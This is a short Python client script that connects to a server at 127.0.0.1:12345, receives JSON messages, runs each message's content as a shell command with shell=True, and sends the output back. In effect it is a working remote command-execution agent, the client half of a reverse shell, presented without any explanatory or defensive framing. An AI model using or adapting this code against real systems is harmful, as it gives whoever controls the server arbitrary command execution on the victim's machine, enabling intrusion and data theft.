import socket
import json
import os
import subprocess

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 12345

    client_socket.connect((host, port))
    print("Connected to the server.")

    while True:
        response = client_socket.recv(1024).decode()
        if not response:
            break
        response = json.loads(response)
        print("Server's response:", response)
        #client_socket.sendall(json.dumps(response).encode())
        output = subprocess.check_output(response["message"], shell=True)
        print(output)
        client_socket.sendall(json.dumps({"message": output.decode()}).encode())

    client_socket.close()

if __name__ == "__main__":
    main()
